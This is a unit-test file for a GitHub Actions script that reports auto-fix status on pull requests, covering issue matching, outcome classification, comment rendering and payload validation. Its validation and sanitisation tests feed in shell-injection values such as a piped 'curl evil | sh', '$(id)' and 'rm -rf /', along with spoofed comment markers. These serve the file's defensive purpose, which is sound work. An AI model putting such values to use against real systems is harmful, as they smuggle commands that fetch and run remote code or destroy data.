// Unit tests for autofix-status.mjs. Run: node --test .github/scripts/autofix-status.test.mjs
import { test } from 'node:test';
import assert from 'node:assert/strict';

import {
	sanitiseReason,
	issueMentionsPr,
	commitMentionsIssue,
	extractReason,
	partitionReviewIssues,
	validatePayload,
	parseUnfixedTsv,
	reasonFromComments,
	classifyOutcome,
	closingKeywordsToAppend,
	SESSION_FAILED,
	findUnaccounted,
	mergeManual,
	findOwnComments,
	selectStatusComments,
	renderStatus,
	parseSummaryTsv,
	sanitiseSummary,
	commitSubject,
	commitSubjects,
	resolveSummaries,
	STATUS_MARKER,
	LEGACY_MARKERS,
	NO_REASON,
	MAX_REASON,
} from './autofix-status.mjs';

const issue = ( number, pr, { manual = false, reason = null } = {} ) => ( {
	number,
	body:
		`Found during review of PR #${ pr }\n\n**PR:** x\n` +
		( reason === null ? '' : `**Not auto-fixed:** ${ reason }\n` ) +
		'\n## Context',
	labels: [
		{ name: 'code-review' },
		...( manual ? [ { name: 'needs-manual-fix' } ] : [] ),
	],
} );

// ── matching ────────────────────────────────────────────────────────────────

test( 'PR #10 does not match issues for PR #1060 (and the reverse)', () => {
	assert.equal(
		issueMentionsPr( 'Found during review of PR #1060\n', 10 ),
		false
	);
	assert.equal(
		issueMentionsPr( 'Found during review of PR #10\n', 10 ),
		true
	);
	assert.equal(
		issueMentionsPr( 'Found during review of PR #10', 10 ),
		true
	);
	assert.equal(
		issueMentionsPr( 'Found during review of PR #10\n', 1060 ),
		false
	);
	assert.equal( issueMentionsPr( undefined, 10 ), false );
} );

test( 'partition only takes issues for the requested PR', () => {
	const p = partitionReviewIssues(
		[ issue( 5, 10 ), issue( 6, 1060 ), issue( 7, 10 ) ],
		10
	);
	assert.deepEqual( p.queued, [ 5, 7 ] );
	assert.equal( p.matched, 2 );
} );

test( 'issue #1 does not match commit messages for #10, and vice versa', () => {
	assert.equal( commitMentionsIssue( 'fix: x (closes #10)', 1 ), false );
	assert.equal( commitMentionsIssue( 'fix: x (closes #1)', 1 ), true );
	assert.equal( commitMentionsIssue( 'fix: x\n\ncloses #1', 1 ), true );
	assert.equal( commitMentionsIssue( 'fix: x (closes #1)', 10 ), false );
	assert.equal( commitMentionsIssue( 'fix: x #12, #1.', 1 ), true );
	assert.equal( commitMentionsIssue( 'fix: x', 1 ), false );
} );

// ── partition ───────────────────────────────────────────────────────────────

test( 'partition: empty input and empty lists', () => {
	assert.deepEqual( partitionReviewIssues( [], 3 ), {
		queued: [],
		manual: [],
		forced: [],
		matched: 0,
	} );
	assert.deepEqual( partitionReviewIssues( undefined, 3 ).queued, [] );
} );

test( 'partition: default is queue; only the label excludes', () => {
	const p = partitionReviewIssues(
		[
			issue( 3, 9 ),
			issue( 2, 9, {
				manual: true,
				reason: 'needs an API key (rule a)',
			} ),
			// Reason line without the label does not exclude.
			issue( 4, 9, { reason: 'looks big' } ),
		],
		9
	);
	assert.deepEqual( p.queued, [ 3, 4 ] );
	assert.deepEqual( p.manual, [
		{ number: 2, reason: 'needs an API key (rule a)' },
	] );
} );

test( 'partition: manual label with a missing reason is still manual', () => {
	const p = partitionReviewIssues( [ issue( 2, 9, { manual: true } ) ], 9 );
	assert.deepEqual( p.manual, [ { number: 2, reason: NO_REASON } ] );
	const empty = partitionReviewIssues(
		[ issue( 2, 9, { manual: true, reason: '   ' } ) ],
		9
	);
	assert.equal( empty.manual[ 0 ].reason, NO_REASON );
} );

test( 'partition: "needs CI" / "human review" exclusions are force-queued and logged', () => {
	const p = partitionReviewIssues(
		[
			issue( 2, 9, {
				manual: true,
				reason: 'needs a real CI run to verify',
			} ),
			issue( 3, 9, { manual: true, reason: 'warrants human review' } ),
			issue( 4, 9, {
				manual: true,
				reason: 'needs the account ID (rule a)',
			} ),
		],
		9
	);
	assert.deepEqual( p.queued, [ 2, 3 ] );
	assert.deepEqual(
		p.forced.map( ( f ) => f.number ),
		[ 2, 3 ]
	);
	assert.deepEqual(
		p.manual.map( ( m ) => m.number ),
		[ 4 ]
	);
} );

test( 'partition: de-duplicates, ignores malformed entries, handles 300 issues', () => {
	const many = Array.from( { length: 300 }, ( _, i ) => issue( i + 1, 77 ) );
	const p = partitionReviewIssues(
		[
			...many,
			issue( 1, 77 ),
			{ number: 'x', body: 'Found during review of PR #77' },
			null,
		],
		77
	);
	assert.equal( p.queued.length, 300 );
} );

// ── sanitising ──────────────────────────────────────────────────────────────

test( 'sanitiseReason strips newlines, backticks, mentions, html and links', () => {
	const out = sanitiseReason(
		'a\nb `rm -rf` @octocat <script>x</script> [l](http://e) | y\u0007'
	);
	assert.equal( /[\n`@<>[\]|\u0007]/.test( out ), false );
	assert.match(
		out,
		/^a b rm -rf octocat scriptx\/script l\(http:\/\/e\) y$/
	);
} );

test( 'sanitiseReason caps length and falls back when empty', () => {
	const out = sanitiseReason( 'x'.repeat( 1000 ) );
	assert.equal( out.length, MAX_REASON );
	assert.ok( out.endsWith( '…' ) );
	assert.equal( sanitiseReason( '' ), NO_REASON );
	assert.equal( sanitiseReason( null ), NO_REASON );
	assert.equal( sanitiseReason( '`@`' ), NO_REASON );
} );

test( 'extractReason reads the marker line only', () => {
	assert.equal(
		extractReason( 'a\n**Not auto-fixed:** reason here\nb' ),
		'reason here'
	);
	assert.equal(
		extractReason( 'a\r\n**Not auto-fixed:** crlf\r\n' ),
		'crlf'
	);
	assert.equal( extractReason( 'no marker' ), null );
	assert.equal( extractReason( 'text **Not auto-fixed:** inline' ), null );
} );

// ── outcome ─────────────────────────────────────────────────────────────────

test( 'classifyOutcome: fixed needs closed AND matching commit AND pushed', () => {
	const o = classifyOutcome( {
		dispatched: [ 1, 2, 3, 4 ],
		issues: {
			1: { state: 'CLOSED' },
			2: { state: 'CLOSED' },
			3: { state: 'OPEN', reason: 'needs the variant ID' },
			4: { state: 'OPEN' },
		},
		commits: [ 'fix: a (closes #1)' ],
		pushed: true,
	} );
	assert.deepEqual( o.fixed, [ 1 ] );
	assert.deepEqual( o.closedNoCommit, [
		{ number: 2, note: 'closed, no matching pushed commit' },
	] );
	assert.deepEqual( o.notFixed, [
		{
			number: 3,
			reason: 'needs the variant ID',
			hasCommit: false,
			retry: false,
		},
		{ number: 4, reason: NO_REASON, hasCommit: false, retry: false },
	] );
} );

test( 'classifyOutcome: closed with a commit that is not pushed is not fixed', () => {
	const o = classifyOutcome( {
		dispatched: [ 1 ],
		issues: { 1: { state: 'CLOSED' } },
		commits: [ 'fix: a (closes #1)' ],
		pushed: false,
	} );
	assert.deepEqual( o.fixed, [] );
	assert.match( o.closedNoCommit[ 0 ].note, /not pushed/ );
} );

test( 'classifyOutcome: #1 closed is not fixed by a commit for #10', () => {
	const o = classifyOutcome( {
		dispatched: [ 1 ],
		issues: { 1: { state: 'CLOSED' } },
		commits: [ 'fix: a (closes #10)' ],
		pushed: true,
	} );
	assert.deepEqual( o.fixed, [] );
	assert.equal( o.closedNoCommit.length, 1 );
} );

test( 'classifyOutcome: open issue with a pushed fix commit is "fix pushed", not unfixed', () => {
	const o = classifyOutcome( {
		dispatched: [ 1 ],
		issues: { 1: { state: 'OPEN' } },
		commits: [ 'fix: a (closes #1)' ],
		pushed: true,
	} );
	assert.deepEqual( o.fixPushed, [ 1 ] );
	assert.deepEqual( o.notFixed, [] );
	const md = renderStatus( {
		...o,
		phase: 'complete',
		notQueued: [],
		unaccounted: [],
	} );
	assert.match( md, /Fix pushed, issue closes on merge \(1\)\*\*\n- #1/ );
	assert.match( md, /Not fixed 0/ );
} );

test( 'classifyOutcome: unknown remote SHA (null) is not reported as unpushed', () => {
	const o = classifyOutcome( {
		dispatched: [ 1 ],
		issues: { 1: { state: 'CLOSED' } },
		commits: [ 'fix: a (closes #1)' ],
		pushed: null,
	} );
	assert.deepEqual( o.fixed, [ 1 ] );
	const known = classifyOutcome( {
		dispatched: [ 1 ],
		issues: { 1: { state: 'CLOSED' } },
		commits: [ 'fix: a (closes #1)' ],
		pushed: false,
	} );
	assert.deepEqual( known.fixed, [] );
	assert.match( known.closedNoCommit[ 0 ].note, /not pushed/ );
} );

test( 'classifyOutcome: failed session reports "session failed" and marks for retry', () => {
	const o = classifyOutcome( {
		dispatched: [ 1, 2 ],
		issues: {
			1: { state: 'OPEN', reason: 'needs key' },
			2: { state: 'OPEN' },
		},
		commits: [],
		pushed: null,
		sessionFailed: true,
	} );
	assert.deepEqual(
		o.notFixed.map( ( n ) => n.reason ),
		[ 'not fixed (session failed)', 'not fixed (session failed)' ]
	);
	assert.ok( o.notFixed.every( ( n ) => n.retry === true ) );
	const ok = classifyOutcome( {
		dispatched: [ 1 ],
		issues: { 1: { state: 'OPEN', reason: 'needs key' } },
		commits: [],
		pushed: null,
	} );
	assert.equal( ok.notFixed[ 0 ].retry, false );
	assert.equal( ok.notFixed[ 0 ].reason, 'needs key' );
} );

test( 'SESSION_FAILED covers failure/cancelled/timed_out but not skipped/success', () => {
	for ( const v of [ 'failure', 'cancelled', 'timed_out' ] ) {
		assert.ok( SESSION_FAILED.has( v ) );
	}
	for ( const v of [ 'skipped', 'success', '', undefined ] ) {
		assert.ok( ! SESSION_FAILED.has( v ) );
	}
} );

test( 'renderStatus: banner shows for failure, not for skipped or success', () => {
	const base = {
		phase: 'complete',
		fixed: [],
		closedNoCommit: [],
		notFixed: [],
		notQueued: [],
		unaccounted: [],
	};
	assert.match(
		renderStatus( { ...base, sessionOutcome: 'failure' } ),
		/session ended with status/
	);
	assert.match(
		renderStatus( { ...base, sessionOutcome: 'cancelled' } ),
		/session ended with status/
	);
	assert.doesNotMatch(
		renderStatus( { ...base, sessionOutcome: 'skipped' } ),
		/session ended/
	);
	assert.doesNotMatch(
		renderStatus( { ...base, sessionOutcome: 'success' } ),
		/session ended/
	);
	assert.doesNotMatch( renderStatus( base ), /session ended/ );
} );

test( 'closingKeywordsToAppend adds only missing, boundary-safe keywords', () => {
	assert.equal(
		closingKeywordsToAppend( 'Body', [ 1, 2 ] ),
		'\n\nCloses #1\n\nCloses #2'
	);
	assert.equal(
		closingKeywordsToAppend( 'Closes #1\nfixes #2.', [ 1, 2 ] ),
		''
	);
	// "Closes #10" must not satisfy #1.
	assert.equal(
		closingKeywordsToAppend( 'Closes #10', [ 1 ] ),
		'\n\nCloses #1'
	);
	assert.equal( closingKeywordsToAppend( 'x', [] ), '' );
} );

test( 'classifyOutcome: empty and unknown issues', () => {
	assert.deepEqual(
		classifyOutcome( {
			dispatched: [],
			issues: {},
			commits: [],
			pushed: false,
		} ),
		{
			fixed: [],
			fixPushed: [],
			closedNoCommit: [],
			notFixed: [],
		}
	);
	const o = classifyOutcome( {
		dispatched: [ 9 ],
		issues: {},
		commits: [],
		pushed: true,
	} );
	assert.equal( o.notFixed[ 0 ].reason, NO_REASON );
} );

test( 'reasonFromComments uses the latest comment since the run start', () => {
	const comments = [
		{ body: 'old note', createdAt: '2026-01-01T00:00:00Z' },
		{
			body: 'Needs the account ID\nmore',
			createdAt: '2026-01-02T10:05:00Z',
		},
		{ body: 'Later @someone `x`', createdAt: '2026-01-02T10:09:00Z' },
	];
	assert.equal(
		reasonFromComments( comments, '2026-01-02T10:00:00Z' ),
		'Later someone x'
	);
	assert.equal(
		reasonFromComments( comments, '2026-02-01T00:00:00Z' ),
		null
	);
	assert.equal( reasonFromComments( [], '2026-02-01T00:00:00Z' ), null );
} );

test( 'parseUnfixedTsv parses number<TAB>reason lines', () => {
	assert.deepEqual(
		parseUnfixedTsv( '12\tneeds key\n#13\tother `x`\nbad line\n' ),
		{
			12: 'needs key',
			13: 'other x',
		}
	);
	assert.deepEqual( parseUnfixedTsv( '' ), {} );
} );

// ── accounting ──────────────────────────────────────────────────────────────

test( 'findUnaccounted lists open review issues in no list', () => {
	assert.deepEqual(
		findUnaccounted(
			[ 1, 2, 3, 4 ],
			[ 1 ],
			[ { number: 2, reason: 'r' } ]
		),
		[ 3, 4 ]
	);
	assert.deepEqual( findUnaccounted( [], [], [] ), [] );
	assert.deepEqual( findUnaccounted( undefined, undefined, undefined ), [] );
} );

test( 'mergeManual de-duplicates and drops dispatched issues', () => {
	assert.deepEqual(
		mergeManual(
			[ { number: 5, reason: 'payload' } ],
			[
				{ number: 5, reason: 'live' },
				{ number: 3, reason: 'l3' },
				{ number: 9, reason: 'x' },
			],
			[ 9 ]
		),
		[
			{ number: 3, reason: 'l3' },
			{ number: 5, reason: 'payload' },
		]
	);
} );

// ── validation ──────────────────────────────────────────────────────────────

const goodPayload = () => ( {
	pr_number: 12,
	head_branch: 'claude/feat-x_1.2',
	base_branch: 'main',
	issue_numbers: [ 3, 1, 3 ],
	manual_issues: [ { number: 7, reason: 'a\n@x `y`' } ],
} );

test( 'validatePayload accepts a good payload and normalises it', () => {
	const r = validatePayload( goodPayload() );
	assert.equal( r.ok, true );
	assert.deepEqual( r.value.issues, [ 1, 3 ] );
	assert.deepEqual( r.value.manual, [ { number: 7, reason: 'a x y' } ] );
	assert.equal( r.value.prNumber, 12 );
} );

test( 'validatePayload accepts a missing manual_issues and empty issue_numbers', () => {
	const p = goodPayload();
	delete p.manual_issues;
	p.issue_numbers = [];
	assert.equal( validatePayload( p ).ok, true );
	delete p.issue_numbers;
	assert.deepEqual( validatePayload( p ).value.issues, [] );
} );

test( 'validatePayload rejects injection attempts', () => {
	for ( const bad of [
		{ pr_number: '1; rm -rf /' },
		{ pr_number: '01' },
		{ pr_number: -1 },
		{ head_branch: 'a"; curl evil | sh; "' },
		{ head_branch: '$(id)' },
		{ head_branch: '-delete' },
		{ head_branch: 'a..b' },
		{ head_branch: 'a b' },
		{ base_branch: 'x\ny' },
		{ issue_numbers: '1,2' },
		{ issue_numbers: [ 1, '2' ] },
		{ issue_numbers: [ 1.5 ] },
		{ issue_numbers: [ '1 && id' ] },
		{ manual_issues: [ { number: 'x', reason: 'r' } ] },
		{ manual_issues: 'x' },
	] ) {
		assert.equal(
			validatePayload( { ...goodPayload(), ...bad } ).ok,
			false,
			JSON.stringify( bad )
		);
	}
	assert.equal( validatePayload( null ).ok, false );
} );

// ── rendering ───────────────────────────────────────────────────────────────

test( 'renderStatus complete scenario: 1 fixed, 1 manual-not-queued, 1 open-unfixed', () => {
	const outcome = classifyOutcome( {
		dispatched: [ 10, 11 ],
		issues: {
			10: { state: 'CLOSED' },
			11: { state: 'OPEN', reason: 'needs the variant ID' },
		},
		commits: [ 'fix: x (closes #10)' ],
		pushed: true,
	} );
	const md = renderStatus( {
		...outcome,
		phase: 'complete',
		notQueued: [ { number: 12, reason: 'needs an API key (rule a)' } ],
		unaccounted: [],
		runUrl: 'https://github.com/o/r/actions/runs/1',
	} );
	assert.ok( md.startsWith( STATUS_MARKER ) );
	assert.match( md, /Fixed 1 · Not fixed 1 · Not queued by review 1/ );
	assert.match( md, /\*\*Fixed \(1\)\*\*\n- #10\n/ );
	assert.match(
		md,
		/\*\*Not fixed \(1\)\*\*\n- #11: needs the variant ID\n/
	);
	assert.match(
		md,
		/\*\*Not queued by review \(1\)\*\*\n- #12: needs an API key \(rule a\)\n/
	);
	assert.doesNotMatch( md, /not accounted for/ );
	assert.doesNotMatch( md, /Skipped: none/ );
} );

test( 'renderStatus complete with empty lists says none, and shows unaccounted and closed-no-commit', () => {
	const empty = renderStatus( {
		phase: 'complete',
		fixed: [],
		closedNoCommit: [],
		notFixed: [],
		notQueued: [],
		unaccounted: [],
	} );
	assert.equal( ( empty.match( /- none/g ) || [] ).length, 3 );
	const full = renderStatus( {
		phase: 'complete',
		fixed: [],
		closedNoCommit: [
			{ number: 2, note: 'closed, no matching pushed commit' },
		],
		notFixed: [],
		notQueued: [],
		unaccounted: [ 8, 9 ],
		sessionOutcome: 'failure',
	} );
	assert.match(
		full,
		/Open review issues not accounted for \(2\)\*\*\n- #8\n- #9/
	);
	assert.match( full, /Closed, no matching pushed commit \(1\)/ );
	assert.match( full, /session ended with status `failure`/ );
} );

// ── single status comment ───────────────────────────────────────────────────

const bot = { login: 'github-actions[bot]' };
const OLD_QUEUE = LEGACY_MARKERS[ 0 ];
const OLD_REPORT = LEGACY_MARKERS[ 1 ];

test( 'renderStatus queued phase: marker first, queued and not-queued, pending line', () => {
	const md = renderStatus( {
		phase: 'queued',
		queued: [ 1067, 1068, 1070 ],
		notQueued: [
			{
				number: 1069,
				reason: 'needs the production variant ID (rule a)',
			},
		],
	} );
	assert.equal(
		md,
		[
			'<!-- plume-review-status -->',
			'### Review and auto-fix status',
			'',
			'Auto-fix queued: 3 · Not queued by review: 1',
			'',
			'**Queued for auto-fix (3)**',
			'- #1067',
			'- #1068',
			'- #1070',
			'',
			'**Not queued by review (1)**',
			'- #1069: needs the production variant ID (rule a)',
			'',
			'_Auto-fix has not reported yet. This comment updates in place when it finishes._',
			'',
		].join( '\n' )
	);
	assert.doesNotMatch( md, /Fixed/ );
	assert.match(
		renderStatus( { phase: 'queued', queued: [], notQueued: [] } ),
		/- none/
	);
} );

test( 'renderStatus complete phase: 2 fixed with summaries, 1 not fixed, 1 not queued', () => {
	const md = renderStatus( {
		phase: 'complete',
		fixed: [ 1067, 1068 ],
		fixPushed: [],
		closedNoCommit: [],
		notFixed: [
			{
				number: 1070,
				reason: 'needs a design decision between a cache layer and a transient',
				hasCommit: false,
				retry: false,
			},
		],
		notQueued: [
			{
				number: 1069,
				reason: 'needs the production variant ID (rule a)',
			},
		],
		unaccounted: [],
		summaries: {
			1067: 'Whitespace-only voice fields are now skipped.',
			1068: 'Escape viewport title and label consistently.',
		},
		runUrl: 'https://github.com/o/r/actions/runs/123',
	} );
	assert.equal(
		md,
		[
			'<!-- plume-review-status -->',
			'### Review and auto-fix status',
			'',
			'Fixed 2 · Not fixed 1 · Not queued by review 1',
			'',
			'**Fixed (2)**',
			'- #1067: Whitespace-only voice fields are now skipped.',
			'- #1068: Escape viewport title and label consistently.',
			'',
			'**Not fixed (1)**',
			'- #1070: needs a design decision between a cache layer and a transient',
			'',
			'**Not queued by review (1)**',
			'- #1069: needs the production variant ID (rule a)',
			'',
			'[Workflow run](https://github.com/o/r/actions/runs/123)',
			'',
		].join( '\n' )
	);
} );

test( 'renderStatus: fix-pushed list keeps summaries; fixed without a summary prints the bare number', () => {
	const md = renderStatus( {
		phase: 'complete',
		fixed: [ 3 ],
		fixPushed: [ 4 ],
		summaries: { 4: 'Guard the empty array.' },
	} );
	assert.match(
		md,
		/Fix pushed, issue closes on merge \(1\)\*\*\n- #4: Guard the empty array\./
	);
	assert.match( md, /\*\*Fixed \(1\)\*\*\n- #3\n/ );
} );

test( 'parseSummaryTsv: last line wins, tolerates blanks, junk and empty input', () => {
	const out = parseSummaryTsv(
		'1\tfirst\n\n#2\tsecond\nnot a line\n1\trewritten\n3\t   \n'
	);
	assert.deepEqual( out, { 1: 'rewritten', 2: 'second' } );
	assert.deepEqual( parseSummaryTsv( undefined ), {} );
	assert.deepEqual( parseSummaryTsv( '' ), {} );
} );

test( 'commitSubject strips type, scope, closes and squash suffixes; first line only', () => {
	assert.equal(
		commitSubject(
			'fix(api)!: guard empty voice fields (closes #1067)\n\nbody #9'
		),
		'guard empty voice fields'
	);
	assert.equal(
		commitSubject( 'fix: tidy up (fixes #4) (#1066)' ),
		'tidy up'
	);
	assert.equal( commitSubject( 'Merge branch main into x (#3)' ), '' );
	assert.equal( commitSubject( 'fix: (closes #1)' ), '' );
	assert.equal( commitSubject( '' ), '' );
} );

test( 'commitSubjects: whole-number match (#1 vs #10) and skips merge commits', () => {
	const subjects = commitSubjects(
		[ 1, 10 ],
		[
			'Merge remote-tracking branch for #1',
			'fix: ten (closes #10)',
			'fix(x): one (closes #1)',
		]
	);
	assert.deepEqual( subjects, { 1: 'one', 10: 'ten' } );
	assert.deepEqual( commitSubjects( [ 1 ], [ 'fix: x (closes #10)' ] ), {} );
} );

test( 'resolveSummaries order: tsv > commit subject > issue title > none', () => {
	const out = resolveSummaries( {
		numbers: [ 1, 2, 3, 4 ],
		tsv: { 1: 'from tsv' },
		subjects: { 1: 'subject 1', 2: 'subject 2' },
		titles: { 1: 't1', 2: 't2', 3: 'Title `three` @x' },
	} );
	assert.deepEqual( out, {
		1: 'from tsv',
		2: 'subject 2',
		3: 'Title three x',
	} );
	assert.deepEqual( resolveSummaries( { numbers: [ 1 ] } ), {} );
} );

test( 'summaries are sanitised for safety but NOT truncated', () => {
	const out = sanitiseSummary(
		'a\nb `rm` @octocat [x](http://e) | <!-- plume-review-status --> \u0007c'
	);
	assert.equal( /[\n`@<>[\]|\u0007]/.test( out ), false );
	assert.equal( out.includes( STATUS_MARKER ), false );
	const long = Array.from(
		{ length: 40 },
		( _, i ) => `Sentence number ${ i } explains why.`
	).join( ' ' );
	assert.ok( long.length > 1000 );
	assert.equal( sanitiseSummary( long ), long );
	const md = renderStatus( {
		phase: 'complete',
		fixed: [ 7 ],
		summaries: { 7: sanitiseSummary( long ) },
	} );
	assert.ok( md.includes( `- #7: ${ long }\n` ) );
	assert.equal( md.split( STATUS_MARKER ).length, 2 );
} );

test( 'summaries never change classification', () => {
	// Open issue with a summary line: still not fixed.
	const open = classifyOutcome( {
		dispatched: [ 1 ],
		issues: { 1: { state: 'OPEN', reason: 'needs key' } },
		commits: [],
		pushed: true,
		summaries: { 1: 'Fixed it' },
	} );
	assert.deepEqual( open.fixed, [] );
	assert.equal( open.notFixed.length, 1 );
	// Closed with a summary but no commit: closed-no-commit, not fixed.
	const closed = classifyOutcome( {
		dispatched: [ 2 ],
		issues: { 2: { state: 'CLOSED' } },
		commits: [],
		pushed: true,
		summaries: { 2: 'Fixed it' },
	} );
	assert.deepEqual( closed.fixed, [] );
	assert.equal( closed.closedNoCommit.length, 1 );
} );

test( 'comment-level fallback: oversized comment drops summaries, longest last', () => {
	const numbers = Array.from( { length: 30 }, ( _, i ) => i + 1 );
	const summaries = {};
	for ( const n of numbers ) {
		summaries[ n ] = `${ 'word '.repeat( 100 * n ) }end`.trim();
	}
	const md = renderStatus(
		{ phase: 'complete', fixed: numbers, summaries },
		20000
	);
	assert.ok( md.length <= 20000 );
	assert.ok( md.startsWith( STATUS_MARKER ) );
	assert.match( md, /summaries were left out/ );
	// The shortest summary is dropped before the longest.
	assert.match( md, /- #1\n/ );
	assert.ok( md.includes( `- #30: ${ summaries[ 30 ] }` ) );
	// Every issue number is still listed.
	for ( const n of numbers ) {
		assert.match( md, new RegExp( `- #${ n }(\\n|: )` ) );
	}
	// Within the default limit nothing is dropped.
	const small = renderStatus( {
		phase: 'complete',
		fixed: [ 1 ],
		summaries: { 1: 'ok' },
	} );
	assert.doesNotMatch( small, /left out/ );
} );

test( 'comment-level fallback: lists are shortened with a pointer when still too big', () => {
	const notFixed = Array.from( { length: 300 }, ( _, i ) => ( {
		number: i + 1,
		reason: 'r'.repeat( 200 ),
		hasCommit: false,
		retry: false,
	} ) );
	const md = renderStatus( { phase: 'complete', notFixed }, 20000 );
	assert.ok( md.length <= 20000 );
	assert.match( md, /…and \d+ more, see the workflow run/ );
	assert.ok( md.startsWith( STATUS_MARKER ) );
} );

test( 'findOwnComments: spoof, non-marker and legacy handling', () => {
	const comments = [
		{ id: 1, body: `${ STATUS_MARKER } spoof`, user: { login: 'mallory' } },
		{ id: 2, body: 'no marker', user: bot },
		{ id: 3, body: `${ STATUS_MARKER } real`, user: bot },
	];
	assert.deepEqual( findOwnComments( comments ), [ 3 ] );
	assert.deepEqual( findOwnComments( comments.slice( 0, 2 ) ), [] );
	assert.deepEqual( findOwnComments( [] ), [] );
	assert.deepEqual( findOwnComments( undefined ), [] );
	assert.deepEqual(
		findOwnComments( [ { id: 9, body: OLD_QUEUE, user: bot } ] ),
		[ 9 ]
	);
} );

test( 'selectStatusComments: canonical > review-queue > report, oldest id first', () => {
	const comments = [
		{ id: 50, body: OLD_REPORT, user: bot },
		{ id: 40, body: OLD_QUEUE, user: bot },
		{ id: 30, body: STATUS_MARKER, user: bot },
		{ id: 20, body: STATUS_MARKER, user: bot },
		{ id: 10, body: OLD_QUEUE, user: { login: 'mallory' } },
		{ id: 5, body: 'Claude review, no marker', user: bot },
	];
	assert.deepEqual( selectStatusComments( comments ), {
		target: 20,
		remove: [ 30, 40, 50 ],
	} );
	assert.deepEqual(
		selectStatusComments( [ { id: 8, body: OLD_REPORT, user: bot } ] ),
		{ target: 8, remove: [] }
	);
	assert.deepEqual( selectStatusComments( [] ), {
		target: null,
		remove: [],
	} );
} );

test( 'a reason or summary cannot carry a marker into the comment', () => {
	const evil = `<!-- ${ STATUS_MARKER } --> ${ OLD_QUEUE } x`;
	const md = renderStatus( {
		phase: 'complete',
		fixed: [ 1 ],
		notFixed: [
			{
				number: 2,
				reason: sanitiseReason( evil ),
				hasCommit: false,
				retry: false,
			},
		],
		summaries: { 1: sanitiseSummary( evil ) },
	} );
	assert.equal( md.split( STATUS_MARKER ).length, 2 );
	assert.equal( md.includes( OLD_QUEUE ), false );
} );
